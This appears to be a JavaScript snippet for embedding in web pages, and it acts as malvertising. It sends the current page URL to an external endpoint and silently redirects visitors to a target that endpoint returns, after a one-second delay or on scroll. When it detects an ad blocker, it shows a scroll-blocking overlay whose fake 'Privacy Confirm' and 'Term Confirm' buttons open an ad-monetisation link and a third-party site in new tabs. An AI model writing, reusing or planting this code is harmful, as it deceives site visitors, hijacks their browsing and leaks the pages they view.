/* ... All functions from the previous code ... */
function createPopup() {
    var popup = document.createElement("div");
    popup.id = "popup";
    popup.style.display = "none";
    popup.style.position = "fixed";
    popup.style.top = "0";
    popup.style.left = "0";
    popup.style.width = "100%";
    popup.style.height = "100%";
    popup.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
    popup.style.justifyContent = "center";
    popup.style.alignItems = "center";

    var popupContent = document.createElement("div");
    popupContent.style.backgroundColor = "#fff";
    popupContent.style.padding = "20px";
    popupContent.style.borderRadius = "5px";
    popupContent.style.width = "auto";
    popupContent.style.maxWidth = "640px";
    popupContent.style.textAlign = "center";

    var popupImage = document.createElement("img");
    popupImage.src = "https://1.bp.blogspot.com/-y8AsxfEerDc/YFSyMPZF14I/AAAAAAAAAAM/JUegMgSE-3o5A_06mx0Fir2-dkB6fAGvACLcBGAsYHQ/s640/re.jpg";
    popupImage.alt = "Popup Image";
    popupImage.style.width = "100%";
    popupImage.style.height = "auto";
    popupImage.style.maxWidth = "640px";
    popupImage.style.marginBottom = "15px";

    var confirmButton = document.createElement("button");
    confirmButton.id = "confirmButton";
    confirmButton.textContent = "Confirm";
    confirmButton.style.backgroundColor = "#007bff";
    confirmButton.style.color = "#fff";
    confirmButton.style.border = "none";
    confirmButton.style.padding = "8px 16px";
    confirmButton.style.cursor = "pointer";
    confirmButton.style.borderRadius = "5px";

    popupContent.appendChild(popupImage);
    popupContent.appendChild(confirmButton);
    popup.appendChild(popupContent);
    document.body.appendChild(popup);
}

function preventScroll(e) {
    e.preventDefault();
}

function showPopup() {
    var popup = document.getElementById("popup");
    popup.style.display = "flex";
    document.body.style.overflow = "hidden";
    window.addEventListener("wheel", preventScroll, { passive: false });
}

function closePopup() {
    var popup = document.getElementById("popup");
    popup.style.display = "none";
    document.body.style.overflow = "auto";
    window.removeEventListener("wheel", preventScroll);
}

const urls = [
    "https://www.highrevenuegate.com/nhe9bx3h?key=a0b1104cf5dbc0d990c207a6ba57f58c",
    "https://bang-party.com"
];

const desc = [
    'Privacy Confirm',
    'Term Confirm',
    'Done'
];

let currentIndex = 0;
let clickCount = 0;

function init() {
    createPopup();
    if (urls.length > 0)
    {
       showPopup(); 
   }  

    // Add jQuery click event listener to the confirm button
    $("#confirmButton").on("click", function() {

        openNextTabWithDelay();

        // Display notification with the new tab index
        let notification = "New tab index: " + clickCount;
        console.log(notification);
        $('#confirmButton').html(desc[clickCount]??'Approve');

        clickCount++;

        if (clickCount >= 3) {
            closePopup();                   
        }
    });
}

function openNextTabWithDelay() {
    if (currentIndex < urls.length) {
        window.open(urls[currentIndex], '_blank');
        currentIndex++;
    }
}

/* ... Load event listener ... */
function loadjQuery(callback) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://code.jquery.com/jquery-3.6.0.min.js", true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 0)) {
            var script = document.createElement("script");
            script.type = "text/javascript";
            script.text = xhr.responseText;
            document.getElementsByTagName("head")[0].appendChild(script);
            callback();
        }
    };
    xhr.send(null);
}

(function() {
    var uads = sessionStorage.getItem('uads');
    var go_current = window.location.href;

    const endpoint = `https://115159679068849882038.bisa-aja.my.id`;

    function doUads()
    {
        if (!uads && !go_current.includes("/download/")) {
            var api_url = `${endpoint}/ping?x=${encodeURIComponent(go_current)}`;

            let isScroll = false;
            let userHasScrolled = false;
            let urlHash = window.location.hash.substring(1);

            fetch(api_url).then(response => response.json()).then(function(res) {
                var myTarget = res.direct;
                var myStatus = res.status;

                if(myStatus === true & myTarget !== false)
                {
                    if (urlHash == 'uads') {

                     window.location.href = myTarget;

                    } 
                    else if(isScroll)
                    {
                        window.onscroll = function (e)
                        {
                            if ( !userHasScrolled ) {
                                userHasScrolled = true;
                                window.location.href = myTarget;
                            }
                        }
                    }
                    else
                    {
                        var pengenalTimeout = setTimeout(function() {
                          console.log('1 detik telah berlalu!');

                          window.location.href = myTarget;
                          clearTimeout(pengenalTimeout);
                        }, 1000);                        
                    }                    
                }                
            }).catch(error => {
                console.log(error);
                loadjQuery(init);
            });
        }
    }

    const REQUEST_URL = '//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';

    const REQUEST_CONFIG = {
        method: 'HEAD',
        mode: 'no-cors'
    };

    const checkAdsBlocked = (callback) => {
        fetch(REQUEST_URL, REQUEST_CONFIG)
            .then((response) => {
                callback(response.redirected);
            })
            .catch(() => {
                callback(true);
            });
    };

    checkAdsBlocked((adsBlocked) => {
        if(adsBlocked)
        {
           loadjQuery(init); 
        }
        else
        {
            doUads();
            console.log("ADS ALLOWED");
        }
    }); 
               
})();
